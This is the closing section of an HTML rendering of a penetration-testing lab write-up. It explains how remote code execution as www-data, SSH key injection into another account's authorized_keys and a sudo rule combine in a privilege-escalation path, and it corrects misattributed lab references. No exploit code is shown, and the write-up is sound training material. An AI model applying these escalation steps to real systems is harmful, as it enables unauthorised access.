+<p><strong>The lab is a two-identity machine, and that is its real pedagogy.</strong> Almost everything interesting is arranged around the gap between <code>www-data</code> (reads, cannot write) and <code>firsthacking</code> (owns the home). The description advertises three techniques; the substance is <strong>one measurement</strong> — the distance between the identity that reaches the code and the identity allowed to write — and the sudo grant is the only thing that crosses it. A tester who uploads a shell and then tries to write a key will hit <code>Permission denied</code> and conclude the lab is broken. The lab only makes sense if you notice that the RCE identity is not the writing identity, and go looking for the bridge.</p>
+<p><strong>The description's third element (&quot;inyección de claves SSH para escalar privilegios&quot;) is the interesting one, because the escalation it advertises is the part that does not work.</strong> The injection succeeds cleanly; the escalation it promises dies on a missing <code>NET_ADMIN</code>, and the <code>docker</code> grant that would have been root is unreachable because its own daemon cannot start. The lab thus teaches something the description gets backwards: <strong>writing another account's <code>authorized_keys</code> changes your identity — it does not, by itself, cross a privilege boundary.</strong> The escalation is a separate, independently-configured sudo rule. Conflating the two is exactly the mistake the report must avoid.</p>
+<p><strong>And the most transferable artifact is a control that fired silently.</strong> OpenSSH refused a world-writable <code>authorized_keys</code> with <code>Permission denied (publickey,password)</code> — an error that mentions neither permissions nor the file. Anyone debugging that will check their key. That is the strongest possible argument for the boring practice of writing <code>0600</code>, and it is a better lesson than the folklore that <code>0644</code> fails, which this target disproved.</p>
+<blockquote>
+<p><strong>Correction — misattribution to lab 118, found in an adversarial audit.</strong> An earlier
+draft of this writeup credited lab 118 with a MIME-map bypass mechanism, a <code>test -w</code>
+trap, and a <code>0644</code> anecdote, and used the first of those to <strong>dismiss</strong> a candidate
+finding. Lab 118 contains <strong>no</strong> upload handler, no MIME map, no <code>AddType</code>, no
+<code>test -w</code> and no <code>0644</code>: it discusses mode <code>4750</code> being too <em>restrictive</em>, which is
+the opposite of the folklore it was credited with. The MIME map is lab 146's
+(F1); the <code>test -w</code>-through-<code>docker exec</code> trap is <code>self-corrections.md</code> §2, recorded in
+thirteen engagements. (This note originally said §11, sourced from &quot;labs 141 and
+129&quot; — §11 is the busybox <code>find -writable</code> entry, which is lab 249's, and lab 141
+contains no <code>test -w</code> at all. An adversarial cross-read caught it, in the very
+correction written to fix a misattribution.) Nothing in the finding set changes, but the reasoning that
+suppressed a candidate was unverified, which is how a real finding disappears
+without anyone noticing.</p>
+</blockquote>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
